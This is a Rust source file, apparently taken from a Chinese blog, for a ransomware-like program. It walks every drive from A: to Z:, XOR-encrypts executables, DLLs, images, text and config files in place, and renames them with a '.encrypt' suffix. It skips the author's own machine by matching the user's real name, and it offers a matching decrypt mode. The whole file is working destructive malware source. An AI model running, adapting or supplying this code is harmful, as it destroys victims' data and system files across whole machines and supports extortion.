//https://blog.csdn.net/wsp_1138886114/article/details/116454414

use lazy_static::lazy_static;
use std::fs;
use std::path::Path;
use std::{str, vec};
use walkdir::{self, Error, WalkDir};
use std::env;
use rand::Rng;
use std::string;

lazy_static! {
    static ref kIncludeBackfix: Vec<&'static str> =
        vec![".exe", ".dll", ".png", ".jpg", ".bmp", ".txt", ".ini",".word",".excel",".ppt"];
        //vec![".tmp"];
    static ref kHardDriver: Vec<&'static str> = vec![
        "A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:",
        "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"
    ];
}

pub fn encrypt_buffer(v: &mut Vec<u8>) {
    for byte in v.iter_mut() {
        *byte = *byte ^ 0x7A;
    }
}

// "???????"+ "dgg"
fn generate_random_string(length: usize) -> String {
    let mut rng = rand::thread_rng();
    let characters: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars().collect();
    let mut random_string = String::with_capacity(length);

    for _ in 0..length {
        let random_index = rng.gen_range(0..characters.len());
        random_string.push(characters[random_index]);
    }

    random_string
}

pub fn encrypt_file(path: &Path) {
    let mut buffer = fs::read(path).expect("");
    encrypt_buffer(&mut buffer);
    fs::write(path, buffer);

    // let mut NewPath = String::from(path.parent());
    //fs::rename(path, format!("{}", path.parent().unwrap().to_str().unwrap().to_owned()+"\\"+&generate_random_string(7)+"dgg"));
    fs::rename(path, format!("{}.encrypt", path.display()));
}
fn remove_extension(file_name: &str) -> String {
    if let Some(dot_idx) = file_name.rfind('.') {
        // 如果找到了最后一个点，将文件名的前半部分返回
        return file_name[0..dot_idx].to_string();
    } else {
        // 否则，返回原始文件名
        return file_name.to_string();
    }
}
pub fn decrypt_file(path: &Path) {
    let mut buffer = fs::read(path).expect("");
    encrypt_buffer(&mut buffer);
    fs::write(path, buffer);
    fs::rename(path,remove_extension(path.to_str().unwrap()));
}

fn main() -> Result<(), Error> {

    // this is my computer
    if whoami::realname() == "asdf" {
        println!("Host Computer\n");
        return Ok(());
    }

    let args: Vec<String> = env::args().collect();
    dbg!(&args);

    let mut encrypt:bool=false;
    if args[1] == "-e"{
        encrypt=true;
        println!("encrypt mode");
    }
    else if args[1] == "-d"{
        encrypt=false;
        println!("decrypt mode");
    }
    else {
        panic!()
    }

    for HardDriver in kHardDriver.iter() {
        let mut count:u64 = 0;
        for entry in WalkDir::new(HardDriver) {
            match entry {
                Ok(DirEntry) => {
                    if encrypt{
                    // 判断指定文件是否符合目标后缀
                    let _BackfixInclude = false;

                    if DirEntry.file_name() == "encryptor.exe"{
                        continue;
                    }
                    for iter in kIncludeBackfix.iter() {
                        if DirEntry.file_name().to_str().unwrap().ends_with(iter) {
                            // 打印文件
                            count = count+1;
                            println!("加密 {} {}", count,format!("{}", DirEntry.path().display()));
                            encrypt_file(DirEntry.path());
                        }
                    }
                }
                else{
                    //if DirEntry.file_name().to_str().unwrap().ends_with("dgg"){
                    if DirEntry.file_name().to_str().unwrap().ends_with(".encrypt"){
                        println!("解密 {}", DirEntry.path().display());

                        decrypt_file(DirEntry.path());
                    }

                }

                    

                }
                Err(_error) => {}
            }
        }
    }

    Ok(())
}
